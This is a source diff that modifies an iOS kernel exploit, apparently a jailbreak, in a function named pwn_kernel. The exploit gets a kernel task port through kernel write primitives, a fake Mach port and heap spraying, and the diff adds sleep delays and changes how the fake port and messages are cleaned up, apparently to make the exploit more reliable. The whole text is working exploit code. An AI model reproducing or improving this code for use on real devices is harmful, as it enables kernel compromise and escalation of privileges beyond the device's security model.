@@ -806,6 +806,8 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     kwrite64(realhost + 0x10 + (sizeof(uint64_t) * 4), new_port);
     LOG("registered realhost->special[4]");
 
+    usleep(500000);
+
     // zero out old ports before overwriting
     for (int i = 0; i < 3; i++)
     {
@@ -815,7 +817,7 @@ kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
     kwrite64(curr_task + offsets.struct_offsets.itk_registered, new_port);
     LOG("wrote new port: %llx", new_port);
     
-    // usleep(500000);
+    usleep(500000);
     
     ret = mach_ports_lookup(mach_task_self(), &maps, &maps_num);
     
@@ -866,12 +868,16 @@ out:;
     LOG("allowing logs to propagate...");
     sleep(1);
 
+    if (fakeport)
+    {
+        fakeport->ip_bits = 0x0;
+        fakeport->ip_kobject = 0x0;
+    }
+
     if (MACH_PORT_VALID(the_one))
     {
         mach_port_deallocate(mach_task_self(), the_one);
     }
-
-    mach_msg_destroy(&ool_message_recv.head);
 
     release_spray_data();
     kdata_cleanup();
